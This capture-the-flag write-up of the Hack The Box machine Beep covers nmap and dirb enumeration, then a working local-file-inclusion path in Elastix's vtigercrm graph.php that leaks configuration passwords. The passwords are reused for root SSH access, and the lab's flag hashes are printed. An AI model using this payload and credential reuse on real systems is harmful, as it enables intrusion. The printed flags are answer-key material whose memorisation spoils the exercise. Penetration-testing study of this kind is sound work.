Enumeration Nmap

sudo nmap 10.10.10.7 -Pn -A         
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 08:36 UTC
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.25% done; ETC: 08:38 (0:01:19 remaining)
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 8.33% done; ETC: 08:38 (0:01:06 remaining)
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 08:37 (0:00:20 remaining)
Nmap scan report for 10.10.10.7
Host is up (0.052s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.10.10.7/
|_http-server-header: Apache/2.2.3 (CentOS)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_pop3-capabilities: TOP UIDL LOGIN-DELAY(0) APOP AUTH-RESP-CODE EXPIRE(NEVER) IMPLEMENTATION(Cyrus POP3 server v2) USER PIPELINING STLS RESP-CODES
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            874/udp   status
|_  100024  1            877/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_imap-capabilities: IMAP4 IMAP4rev1 ANNOTATEMORE OK CATENATE RIGHTS=kxte URLAUTHA0001 CHILDREN NO UIDPLUS ID THREAD=ORDEREDSUBJECT CONDSTORE Completed THREAD=REFERENCES IDLE SORT=MODSEQ SORT NAMESPACE BINARY MULTIAPPEND STARTTLS ATOMIC QUOTA ACL UNSELECT LITERAL+ X-NETSCAPE LIST-SUBSCRIBED LISTEXT RENAME MAILBOX-REFERRALS
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_http-server-header: Apache/2.2.3 (CentOS)
|_ssl-date: 2022-07-11T08:40:41+00:00; +8s from scanner time.
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Elastix - Login page
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
3306/tcp  open  mysql      MySQL (unauthorized)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Website HTTP 80

                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ dirb https://10.10.10.7

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jul 11 08:54:56 2022
URL_BASE: https://10.10.10.7/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://10.10.10.7/ ----
^[[A                                                                                                                         ^[[A                                                                                                                         ^[[A                                                                                                                         ^[[A                                                                                                                         
https://10.10.10.7/admin/                                                                                    
+ https://10.10.10.7/cgi-bin/ (CODE:403|SIZE:286)                                                                           
==> DIRECTORY: https://10.10.10.7/configs/                                                                                  
+ https://10.10.10.7/favicon.ico (CODE:200|SIZE:894)                                                                        
==> DIRECTORY: https://10.10.10.7/help/                                                                                     
==> DIRECTORY: https://10.10.10.7/images/                                                                                   
+ https://10.10.10.7/index.php (CODE:200|SIZE:1785)                                                                         
==> DIRECTORY: https://10.10.10.7/lang/                                                                                     
==> DIRECTORY: https://10.10.10.7/libs/                                                                                     
==> DIRECTORY: https://10.10.10.7/mail/                                                                                     
==> DIRECTORY: https://10.10.10.7/modules/                                                                                  
==> DIRECTORY: https://10.10.10.7/panel/                                                                                    
+ https://10.10.10.7/robots.txt (CODE:200|SIZE:28)                                                                          
==> DIRECTORY: https://10.10.10.7/static/                                                                                   
==> DIRECTORY: https://10.10.10.7/themes/                                                                                   
==> DIRECTORY: https://10.10.10.7/var/                                                                                      
                                                                                                                            
---- Entering directory: https://10.10.10.7/admin/ ----
==> DIRECTORY: https://10.10.10.7/admin/common/                                                                             
+ https://10.10.10.7/admin/favicon.ico (CODE:200|SIZE:318)                                                                  
==> DIRECTORY: https://10.10.10.7/admin/images/                                                                             
+ https://10.10.10.7/admin/index.php (CODE:302|SIZE:0)                                                                      
+ https://10.10.10.7/admin/modules (CODE:403|SIZE:291)                                                                      
+ https://10.10.10.7/admin/views (CODE:403|SIZE:289)                                                                        
                                                                                                                            
---- Entering directory: https://10.10.10.7/configs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                            
---- Entering directory: https://10.10.10.7/help/ ----

Visited the website:



Website running Elastix with a database backend housing username and passwords for the site.

More Enumeration Searchsploit

searchsploit elastix
------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                               |  Path
------------------------------------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                        | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                      | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                             | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                            | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                           | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution  


Exploitation

#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

We get some great stuff:

AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

We take the admin password and go plug it into ssh:

 ssh root@10.10.10.7              
The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.
root@10.10.10.7's password: 
Last login: Tue Jul 16 11:45:47 2019                                                                       Open Sesame

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# cat /root/Desktop/root.txt
cat: /root/Desktop/root.txt: No such file or directory
[root@beep ~]# ls
anaconda-ks.cfg  elastix-pr-2.2-1.i386.rpm  install.log  install.log.syslog  postnochroot  root.txt  webmin-1.570-1.noarch.rpm
[root@beep ~]# cat root.txt
4155448a49c127efb612ff62267aaa89
[root@beep ~]# cd /
[root@beep /]# cd home
[root@beep home]# ls
fanis  spamfilter
[root@beep home]# cd fanis
[root@beep fanis]# cat user.tx
cat: user.tx: No such file or directory
[root@beep fanis]# cat user.txt
9e007ba5aa38b5a81de33d5a35a4752c
